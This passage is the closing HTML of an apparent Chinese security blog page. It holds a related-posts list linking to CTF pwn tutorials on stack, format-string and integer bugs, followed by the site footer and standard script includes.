data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-27</div><div class="relatedPosts_title">pwn题如何配置和靶机一样的环境</div></div></a></div><div class="relatedPosts_item"><a href="/2022-05/从0开始的pwn题环境配置/" title="从0开始的pwn题环境配置"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-27</div><div class="relatedPosts_title">从0开始的pwn题环境配置</div></div></a></div><div class="relatedPosts_item"><a href="/2022-04/PWN入门到入狱-Code/" title="PWN入门到入狱-Code"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-15</div><div class="relatedPosts_title">PWN入门到入狱-Code</div></div></a></div><div class="relatedPosts_item"><a href="/2022-03/PWN入门到入狱-Integer/" title="PWN入门到入狱-Integer"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-28</div><div class="relatedPosts_title">PWN入门到入狱-Integer</div></div></a></div><div class="relatedPosts_item"><a href="/2022-03/PWN入门到入狱-Format/" title="PWN入门到入狱-Format"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-28</div><div class="relatedPosts_title">PWN入门到入狱-Format</div></div></a></div><div class="relatedPosts_item"><a href="/2022-03/PWN入门到入狱-Stack/" title="PWN入门到入狱-Stack"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-28</div><div class="relatedPosts_title">PWN入门到入狱-Stack</div></div></a></div></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Ma9icCR</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font_plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font_minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script id="ribbon_piao" mobile="false" src="/js/third-party/piao.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script></body></html>